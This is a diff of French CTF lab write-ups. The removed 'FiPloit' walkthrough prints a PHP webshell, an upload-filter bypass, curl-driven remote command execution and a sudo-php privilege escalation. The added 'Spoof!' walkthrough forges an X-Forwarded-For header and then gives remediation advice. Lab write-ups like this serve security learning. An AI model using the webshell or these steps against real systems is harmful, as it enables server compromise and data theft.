@@ -1,295 +1,159 @@
-# FiPloit — HackerDNA | Write-up
+# Spoof! — HackerDNA | Write-up
 
-**Plateforme:** FiPloitLab  
+**Plateforme:** HackerDNA  
 **Difficulte:** Facile  
-**Points:** 20  
-**Flags:** 2  
+**Points:** 10  
+**Flags:** 1  
+**Taux de reussite global:** 68%  
+**Categorie:** IP Spoofing  
 **Auteur:** doacyber  
 
-![FiPloit Lab](fiPloit_lab.png)
+![Spoof Lab](spoof_lab.png)
 
 ---
 
 ## Introduction
 
-Ce lab simule une application web PHP vulnerable qui tourne dans un environnement de type entreprise fictive appele **SecureCorp**.
+Ce lab simule une application web d'entreprise fictive appelee **TechSolutions** qui restreint l'acces a certaines ressources selon l'adresse IP du visiteur. Seules les connexions venant du reseau interne de l'entreprise sont autorisees.
 
-L'objectif est de compromettre le serveur en obtenant deux flags :
-- Un flag utilisateur (user flag)
-- Un flag root (privilege maximum)
-
-Les techniques utilisees dans ce lab :
-- Decouverte de service sur port non standard
-- Enumeration de fichiers et repertoires
-- Divulgation d'informations sensibles
-- Contournement de validation d'upload de fichiers
-- Execution de code a distance (RCE)
-- Escalade de privileges via mauvaise configuration sudo
+L'objectif est de contourner cette restriction et de recuperer le flag cache.
 
 ---
 
-## Etape 1 — Decouverte du service web
+## Etape 1 — Decouverte de l'application
 
-La premiere chose que j'ai faite c'est d'acceder a la cible dans le navigateur via le port HTTP classique :
-
-```
-http://TARGET_IP
-```
-
-La page ne chargeait pas. Apres avoir teste manuellement, j'ai trouve que l'application tournait sur le **port 8080** :
+En accedant a la cible dans le navigateur :
 
 ```
-http://TARGET_IP:8080
+http://52.213.44.198/index.php
 ```
 
-Dans un vrai pentest, j'aurais utilise nmap pour scanner tous les ports :
+Le serveur affiche le message suivant :
+
+```
+TechSolutions
+
+Your IP: 196.207.231.56
+You are not connecting from company network (52.213.44.198).
+Password is required for external access.
+```
+
+Le serveur connait son IP interne : `52.213.44.198`. Il compare l'IP du visiteur avec cette IP et refuse l'acces si ca ne correspond pas.
+
+---
+
+## Etape 2 — Identification de la vulnerabilite
+
+Beaucoup de serveurs web tournent derriere des proxys inverses ou des load balancers. Dans ce cas, l'IP d'origine du client est transmise via des headers HTTP speciaux :
+
+- `X-Forwarded-For`
+- `X-Real-IP`
+- `Client-IP`
+
+Si le serveur fait confiance a ces headers **sans verifier qu'ils viennent d'un proxy de confiance**, n'importe qui peut les falsifier et se faire passer pour une autre IP.
+
+C'est exactement ce qui se passe ici.
+
+---
+
+## Etape 3 — Exploitation (IP Spoofing via HTTP Header)
+
+J'ai utilise `curl` pour envoyer une requete en ajoutant manuellement le header `X-Forwarded-For` avec l'IP interne de l'entreprise :
 
 ```bash
-nmap -sC -sV -p- TARGET_IP
+curl -v -L -H "X-Forwarded-For: 52.213.44.198" http://52.213.44.198/index.php
 ```
 
-- `-sC` : lance les scripts de detection par defaut
-- `-sV` : detecte les versions des services
-- `-p-` : scanne tous les 65535 ports
+Explication de chaque option :
+
+- `curl` : outil pour faire des requetes HTTP depuis le terminal
+- `-v` : mode verbose, affiche tous les details de la requete et de la reponse
+- `-L` : suit automatiquement les redirections (302, 301...)
+- `-H` : ajoute un header HTTP personnalise a la requete
+- `"X-Forwarded-For: 52.213.44.198"` : on ment au serveur en lui disant que notre requete vient de l'IP interne
 
 ---
 
-## Etape 2 — Enumeration des fichiers et repertoires
+## Etape 4 — Resultat
 
-Une fois sur l'application, j'ai lance **Gobuster** pour decouvrir des fichiers ou repertoires caches :
-
-```bash
-gobuster dir -u http://TARGET_IP:8080 \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
-  -x txt,php,log,bak
-```
-
-- `dir` : mode enumeration de repertoires
-- `-u` : l'URL cible
-- `-w` : la wordlist utilisee pour bruteforcer les noms
-- `-x` : extensions a tester en plus (txt, php, log, bak)
-
-**Resultats interessants trouves :**
+Le serveur a retourne une redirection :
 
 ```
-/notes.txt
-/upload_log_temp4.php
+HTTP/1.1 302 Found
+Location: /2kf84qoqi6sviu7poeu54p9b/flag.txt
 ```
 
----
-
-## Etape 3 — Divulgation d'informations sensibles
-
-J'ai ouvert le fichier `notes.txt` directement dans le navigateur :
+Grace au `-L`, curl a suivi automatiquement la redirection et a recupere le flag :
 
 ```
-http://TARGET_IP:8080/notes.txt
-```
-
-Le fichier contenait des notes internes de developpeur :
-
-```
-Remove /upload_log_temp4.php before prod
-Database creds: root:Password123!
-Fix contact form
-Disable debug
-```
-
-Ce type de fichier oublie sur un serveur de production est ce qu'on appelle de la **divulgation d'informations sensibles (Information Disclosure)**.
-
-Deux informations cles recuperees :
-- Des identifiants de base de donnees en clair
-- L'existence d'un endpoint d'upload non supprime : `/upload_log_temp4.php`
-
----
-
-## Etape 4 — Exploration de la page d'upload
-
-En accedant a la page :
-
-```
-http://TARGET_IP:8080/upload_log_temp4.php
-```
-
-J'ai trouve un formulaire qui permettait d'uploader des fichiers, mais uniquement avec l'extension `.txt`.
-
-Quand j'ai essaye d'uploader directement un fichier PHP nomme `shell.php`, l'upload etait refuse.
-
----
-
-## Etape 5 — Contournement de la validation (File Upload Bypass)
-
-Apres analyse du comportement de l'application, j'ai compris que la validation ne verifiait pas que le fichier **se terminait** par `.txt`, mais seulement que `.txt` etait **present quelque part** dans le nom du fichier.
-
-J'ai donc nomme mon fichier :
-
-```
-shell.txt.php
-```
-
-Le serveur Apache/PHP interprete la **derniere extension** comme type de fichier. Donc :
-- La validation voit `.txt` → elle accepte le fichier
-- Le serveur voit `.php` → il execute le fichier comme du PHP
-
-C'est une vulnerabilite classique appelee **Improper File Extension Validation**.
-
-Le contenu du fichier uploade :
-
-```php
-<?php system($_GET['cmd']); ?>
-```
-
-Ce code PHP execute n'importe quelle commande passee dans le parametre `cmd` de l'URL.
-
----
-
-## Etape 6 — Execution de code a distance (RCE)
-
-Une fois l'upload reussi, il fallait trouver ou le fichier avait ete depose sur le serveur.
-
-**Reflexe important :** quand un formulaire PHP accepte un upload, le fichier est presque toujours stocke dans un dossier `/uploads/`. C'est la convention la plus courante.
-
-J'ai donc teste directement :
-
-```
-http://TARGET_IP:8080/uploads/shell.txt.php?cmd=whoami
-```
-
-- `uploads/` : dossier standard ou les fichiers uploades sont stockes
-- `shell.txt.php` : mon fichier uploade
-- `?cmd=whoami` : la commande que je veux executer sur le serveur
-
-Le serveur a retourne :
-
-```
-ctf
-```
-
-L'execution de code a distance etait confirmee.
-
-**Note sur les `+` dans l'URL :** Les espaces sont interdits dans les URLs. Le `+` est l'encodage d'un espace dans les parametres GET. Donc `cmd=sudo+ls` est lu par le serveur comme `sudo ls`.
-
----
-
-## Etape 7 — Recuperation du flag utilisateur
-
-Avec le RCE confirme, j'ai enumere le systeme via curl depuis mon terminal :
-
-```bash
-curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=ls+/home"
-curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=cat+/home/ctf/flag-user.txt"
-```
-
-**User flag obtenu.**
-
----
-
-## Etape 8 — Enumeration des privileges sudo
-
-Pour chercher comment escalader les privileges vers root :
-
-```bash
-curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=sudo+-l"
-```
-
-- `sudo -l` : affiche la liste des commandes que l'utilisateur peut executer avec sudo
-
-Resultat :
-
-```
-User ctf may run the following commands on ip-10-0-3-91:
-    (ALL) NOPASSWD: /bin/ls, /usr/bin/file, /usr/bin/php
-```
-
-L'utilisateur `ctf` peut executer **PHP en tant que root sans mot de passe**. C'est une misconfiguration critique.
-
----
-
-## Etape 9 — Escalade de privileges vers root
-
-`sudo cat` n'etait pas dans la liste des commandes autorisees. J'ai utilise PHP a la place :
-
-```bash
-curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=sudo+php+-r+%22echo+file_get_contents('/root/flag-root.txt');%22"
-```
-
-Decomposition de la commande :
-
-- `sudo` : execute en tant que root
-- `php -r` : execute du code PHP directement en ligne de commande
-- `file_get_contents('/root/flag-root.txt')` : fonction PHP qui lit le contenu d'un fichier
-- `%22` et `%27` : encodage URL des guillemets `"` et `'`
-
-**Root flag obtenu :**
-
-```
+HTTP/1.1 200 OK
+...
 xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
 ```
 
-![Felicitations](felicitations.png)
+Le serveur a cru que la requete venait du reseau interne et nous a donne acces au flag.
 
 ---
 
-## Chaine d'exploitation complete
+## Ce qui s'est passe en detail
 
 ```
-Port 8080 decouvert
-        |
-Enumeration avec Gobuster
-        |
-notes.txt trouve → credentials + endpoint upload
-        |
-Upload de shell.txt.php (bypass double extension)
-        |
-RCE via ?cmd= dans l'URL
-        |
-User flag obtenu (/home/ctf/flag-user.txt)
-        |
-sudo -l → PHP autorise sans mot de passe
-        |
-sudo php -r file_get_contents() → lecture de /root/flag-root.txt
-        |
-Root flag obtenu
+Nous                              Serveur
+  |                                  |
+  |-- X-Forwarded-For: IP interne -->|
+  |                                  |
+  |   Serveur verifie le header      |
+  |   et croit qu'on est en interne  |
+  |                                  |
+  |<-- 302 redirect vers flag -------|
+  |                                  |
+  |-- GET /flag.txt ---------------->|
+  |                                  |
+  |<-- flag ! -----------------------|
 ```
 
----
-
-## Difficultes rencontrees
-
-### 1. Trouver le dossier uploads
-
-Apres avoir uploade le fichier avec succes, la page ne donnait aucune indication sur l'endroit ou le fichier avait ete stocke. Je ne savais pas qu'il fallait aller chercher dans `/uploads/`.
-
-**Lecon retenue :** quand un upload reussit sur une appli PHP, le reflexe est de tester `/uploads/nom_du_fichier` en premier. Si ca ne marche pas, relancer gobuster apres l'upload pour decouvrir le nouveau repertoire.
-
-### 2. Les guillemets dans l'URL
-
-Quand j'ai essaye d'executer `sudo php -r '...'` directement dans le navigateur, ca ne fonctionnait pas a cause des guillemets simples qui sont mal interpretes dans les URLs.
-
-**Solution :** utiliser `curl` depuis le terminal avec les guillemets encodes en URL (`%22` pour `"` et `%27` pour `'`).
-
-### 3. cat bloque par sudo
-
-Je pensais pouvoir lire le flag root avec `sudo cat /root/flag-root.txt` mais `cat` n'etait pas dans la liste sudo. Il a fallu trouver une alternative avec PHP et `file_get_contents()`.
+**Pourquoi le `-L` etait indispensable :** sans lui, curl s'arrete au 302 et n'affiche rien. C'est pour ca que la premiere tentative sans `-L` retournait une reponse vide.
 
 ---
 
-## Vulnerabilites identifiees
+## Difficulte rencontree
 
-| Vulnerabilite | Localisation | Impact |
+La premiere commande sans `-L` ne retournait rien :
+
+```bash
+curl -H "X-Forwarded-For: 52.213.44.198" http://52.213.44.198/index.php
+```
+
+Le serveur repondait bien avec un 302, mais curl s'arretait la et n'affichait pas le contenu. Il fallait ajouter `-L` pour que curl suive la redirection automatiquement jusqu'au flag.
+
+**Lecon retenue :** toujours ajouter `-L` avec curl quand on teste des applis web, car beaucoup utilisent des redirections.
+
+---
+
+## Vulnerabilite identifiee
+
+| Vulnerabilite | Description | Impact |
 |---|---|---|
-| Information Disclosure | /notes.txt | Credentials et endpoints exposes |
-| File Upload Bypass | /upload_log_temp4.php | Upload de webshell PHP |
-| Remote Code Execution | /uploads/shell.txt.php | Controle total du serveur |
-| Sudo Misconfiguration | /etc/sudoers | Escalade vers root |
+| IP Spoofing via HTTP Headers | Le serveur fait confiance au header X-Forwarded-For sans validation | Contournement du controle d'acces IP |
+
+---
+
+## Remediation
+
+Pour eviter cette vulnerabilite :
+
+- Ne jamais faire confiance aux headers `X-Forwarded-For` ou `X-Real-IP` venant directement des clients
+- Faire confiance a ces headers uniquement s'ils viennent de proxys internes de confiance
+- Utiliser une authentification reelle plutot qu'un simple controle d'acces par IP
+- Valider l'IP source au niveau reseau, pas uniquement au niveau applicatif
 
 ---
 
 ## Conclusion
 
-Ce lab illustre parfaitement comment plusieurs petites vulnerabilites peuvent se combiner pour compromettre un systeme entierement. Aucune de ces failles n'est spectaculaire isolement, mais enchainees, elles permettent de passer de zero a root.
+Ce challenge demontre qu'un controle d'acces base uniquement sur l'adresse IP est facilement contournable quand le serveur fait confiance a des headers HTTP que n'importe qui peut falsifier. Une seule commande curl a suffi pour bypasser la restriction et obtenir le flag.
 
-Le point le plus important de ce lab : **comprendre le raisonnement derriere chaque etape**, pas juste executer des commandes.
+![Felicitations](felicitations.png)
 
 ---
 
